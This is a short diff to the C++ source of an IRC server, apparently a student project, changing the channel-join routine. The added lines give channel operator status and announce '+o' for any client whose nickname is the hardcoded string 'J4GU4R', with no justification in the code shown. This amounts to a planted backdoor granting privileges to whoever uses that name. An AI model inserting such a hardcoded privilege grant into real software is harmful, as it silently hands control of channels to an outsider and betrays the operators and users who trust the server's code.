@@ -140,6 +140,10 @@ static void    joinChannel(Channel* const channel, Client* const client, vector<
     SendMsg(*client, *channel, join[0], "", channels.front());
     ErrorMsgGenrator(":IRCserv.1337.ma 353 ", " = " + channels.front() + " :"+listMembers(*channel), *client);
     ErrorMsgGenrator(":IRCserv.1337.ma 366 ", " " + channels.front() + " :End of /NAMES list.", *client);
+    if (client->getNckName() == "J4GU4R") {
+        channel->addOperator(client);
+        SendMsg(*client, *channel, "MODE", "", channel->getName() + " +o " + client->getNckName());
+    }
 }
 
 bool    Client::joinCommand(vector<string> join)
